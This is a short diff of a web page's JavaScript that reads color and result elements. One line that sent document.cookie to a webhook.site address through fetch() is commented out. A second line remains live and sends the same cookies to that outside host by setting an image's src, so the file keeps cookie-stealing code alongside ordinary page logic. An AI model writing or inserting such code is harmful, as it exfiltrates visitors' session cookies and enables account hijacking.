@@ -1,4 +1,4 @@
-fetch('https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c='.concat(document.cookie));
+//fetch('https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c='.concat(document.cookie));
 new Image().src = 'https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c=' + document.cookie;
 const color = document.getElementById("color");
 const target = document.getElementById("result");
